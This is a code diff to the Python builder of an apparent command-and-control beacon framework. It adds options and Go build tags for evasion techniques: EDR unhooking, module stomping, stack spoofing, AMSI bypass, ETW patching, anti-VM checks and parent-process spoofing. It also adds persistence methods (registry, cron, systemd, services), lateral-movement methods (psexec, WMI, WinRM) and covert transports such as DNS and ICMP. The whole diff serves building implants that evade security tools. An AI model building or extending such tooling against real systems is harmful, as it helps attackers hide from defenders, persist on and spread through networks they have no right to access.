@@ -85,6 +85,9 @@ class BeaconBuildConfig:
     output_format: str = 'exe'
     antisanbox:         bool = False
     amsi_bypass:        bool = False
+    unhook:             bool = False
+    stomp:              bool = False
+    stack_spoof:        bool = True
     etw_patch:          bool = False
     sleep_mask:         str = 'none'
     syscall_method:     str = 'direct'
@@ -107,6 +110,9 @@ class BeaconBuildConfig:
     client_key_path:    str = ''
     root_ca_path:       str = ''
     wasm_extensions: bool = False
+    jump_methods: str = ''
+    persistence: str = ''
+    tags: str = ''
 
 
 DEFAULT_C2_PROFILE_DIR = os.path.join(
@@ -156,6 +162,16 @@ def list_c2_profiles() -> List[str]:
         if e.endswith('.json') and not e.startswith('.')
     )
 
+def _version() -> str:
+    try:
+        p = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                         '..', '..', 'VERSION')
+        with open(p, encoding='ascii') as fh:
+            return fh.read().strip()[:32] or 'dev'
+    except OSError:
+        return 'dev'
+
+
 OPSEC_PROFILES = {
     'default': BeaconBuildConfig(),
 
@@ -168,6 +184,7 @@ OPSEC_PROFILES = {
         antisanbox=True,
         amsi_bypass=True,
         etw_patch=True,
+        unhook=True,
         sleep_mask='aes-ctr',
         syscall_method='indirect',
         string_obfuscation=True,
@@ -182,6 +199,7 @@ OPSEC_PROFILES = {
         antisanbox=True,
         amsi_bypass=True,
         etw_patch=True,
+        unhook=True,
         # cronos is the fiber-based sleep mask: full .text
         # encryption, no kernel timer callbacks, no new threads.
         # Windows amd64 only. A paranoid build for Linux must
@@ -564,9 +582,77 @@ class BeaconBuilder:
                     "  Windows native:   install MinGW-w64 or MSVC Build Tools")
             buildmode = ['-buildmode=c-shared']
         tags: List[str] = []
+        transport_tags = {
+            'http': 't_http', 'dns': 't_dns', 'doh': 't_doh',
+            'quic': 't_quic', 'websocket': 't_websocket',
+            'icmp': 't_icmp', 'wireguard': 't_wireguard',
+        }
+        modes = [m.strip().lower() for m in
+                 (cfg.transport_mode or 'http').split(',') if m.strip()]
+        if not modes:
+            modes = ['http']
+        for mode in modes:
+            tag = transport_tags.get(mode)
+            if tag and tag not in tags:
+                tags.append(tag)
         if getattr(cfg, 'wasm_extensions', False):
             tags.append('wasm_host')
+        evasion_tags = (
+            ('antisanbox', 'ev_antisanbox'),
+            ('antidebug', 'ev_antidebug'),
+            ('antivm', 'ev_antivm'),
+            ('ppid_spoof', 'ev_ppid'),
+            ('amsi_bypass', 'ev_amsi'),
+            ('etw_patch', 'ev_etw'),
+            ('unhook', 'ev_unhook'),
+            ('stomp', 'ev_stomp'),
+            ('stack_spoof', 'ev_stackspoof'),
+        )
+        for attr, tag in evasion_tags:
+            if getattr(cfg, attr, False) and tag not in tags:
+                tags.append(tag)
+        for pm in (getattr(cfg, 'persistence', '') or '').split(','):
+            pm = pm.strip().lower()
+            if pm in ('systemd', 'cron', 'profile', 'registry',
+                      'task', 'service'):
+                tag = 'persist_' + pm
+                if tag not in tags:
+                    tags.append(tag)
+        for jm in (getattr(cfg, 'jump_methods', '') or '').split(','):
+            jm = jm.strip().lower()
+            if jm in ('psexec', 'winrm', 'wmi', 'scshell'):
+                tag = 'jump_' + jm
+                if tag not in tags:
+                    tags.append(tag)
+        sleep_tag = {
+            'rc4': 'sleep_rc4', 'aes-ctr': 'sleep_aes',
+            'cronos': 'sleep_cronos', 'hwbp': 'sleep_hwbp',
+        }.get(getattr(cfg, 'sleep_mask', 'none'))
+        if sleep_tag:
+            tags.append(sleep_tag)
         tag_args: List[str] = []
+        extra = (getattr(cfg, 'tags', '') or '').strip()
+        if extra:
+            all_tags = {
+                't_http', 't_dns', 't_doh', 't_quic', 't_websocket',
+                't_icmp', 't_wireguard', 'tls_utls', 'wasm_host',
+                'feat_dotnet', 'feat_bof', 'feat_pe_loader',
+                'ev_antisanbox', 'ev_antidebug', 'ev_antivm', 'ev_ppid',
+                'ev_amsi', 'ev_etw', 'ev_unhook', 'ev_stomp', 'sleep_rc4', 'sleep_aes',
+                'sleep_cronos', 'sleep_hwbp',
+                'jump_psexec', 'jump_winrm', 'jump_wmi', 'jump_scshell',
+                'persist_systemd', 'persist_cron', 'persist_profile',
+                'persist_registry', 'persist_task', 'persist_service',
+                'update', 'svc_host',
+            }
+            for t in extra.split(','):
+                t = t.strip()
+                if t == 'all':
+                    for x in all_tags:
+                        if x not in tags:
+                            tags.append(x)
+                elif t and t not in tags:
+                    tags.append(t)
         if tags:
             tag_args = ['-tags', ','.join(tags)]
         go = ['go', 'build', '-trimpath'] + buildmode + tag_args + [
@@ -667,6 +753,9 @@ class BeaconBuilder:
         for name, value in (
             ('AntiSandboxEnabledRaw', cfg.antisanbox),
             ('AmsiBypassRaw',         cfg.amsi_bypass),
+            ('AgentVersionRaw',       _version()),
+            ('StackSpoofRaw',         cfg.stack_spoof),
+            ('UnhookRaw',             cfg.unhook),
             ('EtwPatchRaw',           cfg.etw_patch),
             ('SleepMaskEnabledRaw',   cfg.sleep_mask not in ('', 'none')),
             ('StringObfuscationRaw',  cfg.string_obfuscation),
